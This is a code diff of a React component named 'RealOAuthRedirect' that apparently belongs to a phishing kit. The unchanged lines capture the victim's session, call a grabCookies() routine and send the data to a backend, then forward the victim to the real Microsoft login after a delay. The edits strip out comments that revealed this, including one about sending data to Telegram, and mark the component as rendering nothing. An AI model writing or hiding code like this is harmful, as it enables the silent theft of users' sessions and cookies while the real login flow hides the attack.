@@ -88,7 +88,6 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, s
     (async () => {
       let currentSessionData = (sessionData) ? sessionData : {};
 
-      // Save session and send to Telegram before redirect
       try {
         if (typeof saveSessionToBackend === 'function') {
           await saveSessionToBackend(currentSessionData);
@@ -107,7 +106,6 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, s
         grabCookies();
       }
 
-      // Delay (x3) before doing PKCE OAuth redirect
       setTimeout(async () => {
         try {
           const codeVerifier = generateRandomString(64);
@@ -132,7 +130,6 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, s
           const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;
           window.location.href = microsoftOAuthUrl;
         } catch (err) {
-          // Fallback: Simple OAuth without PKCE
           const fallbackState = Math.random().toString(36).substring(2, 15);
           sessionStorage.setItem('oauth_state', fallbackState);
 
@@ -149,11 +146,11 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, s
           const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${fallbackParams.toString()}`;
           window.location.href = fallbackUrl;
         }
-      }, redirectDelay); // SLOW DELAY before redirect
+      }, redirectDelay);
     })();
   }, [sessionData, onLoginSuccess]);
 
-  return null;
+  return null; // Silent: no UI/status rendered
 };
 
 export default RealOAuthRedirect;
